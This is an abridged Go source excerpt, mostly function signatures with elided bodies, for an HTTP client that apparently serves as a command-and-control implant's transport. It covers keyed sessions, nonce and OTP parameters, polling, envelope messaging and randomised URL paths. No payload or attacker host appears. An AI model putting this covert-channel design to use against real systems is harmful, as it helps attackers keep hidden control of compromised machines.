...
func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*RevilsHTTPClient, error) {
	var client *RevilsHTTPClient
	var err error
	if !opts.ForceHTTP {
...
// RevilsHTTPClient - Helper struct to keep everything together
type RevilsHTTPClient struct {
	Origin      string
	PathPrefix  string
	driver      HTTPDriver
	ProxyURL    string
...
func (s *RevilsHTTPClient) SessionInit() error {
...
func (s *RevilsHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
	values := uri.Query()
...
func (s *RevilsHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
	values := uri.Query()
...
func (s *RevilsHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
...
func (s *RevilsHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, error) {
...
// session key yet.
func (s *RevilsHTTPClient) establishSessionID(sessionInit []byte) error {
...
func (s *RevilsHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
	if s.Closed {
...
func (s *RevilsHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.Closed {
		return ErrClosed
	}
...
func (s *RevilsHTTPClient) CloseSession() error {
	if s.Closed {
		return nil
	}
	if s.SessionID == "" {
...
func (s *RevilsHTTPClient) pathJoinURL(segments []string) string {
...
func (s *RevilsHTTPClient) pollURL() *url.URL {
...
func (s *RevilsHTTPClient) startSessionURL() *url.URL {
...
func (s *RevilsHTTPClient) sessionURL() *url.URL {
	curl, _ := url.Parse(s.Origin)
	segments := []string{
...
func (s *RevilsHTTPClient) closeURL() *url.URL {
	curl, _ := url.Parse(s.Origin)
...
func (s *RevilsHTTPClient) randomPath(segments []string, filenames []string, ext string) []string {
	genSegments := []string{}
	if 0 < len(segments) {
...
func httpClient(address string, opts *HTTPOptions) *RevilsHTTPClient {
...
func httpsClient(address string, opts *HTTPOptions) *RevilsHTTPClient {
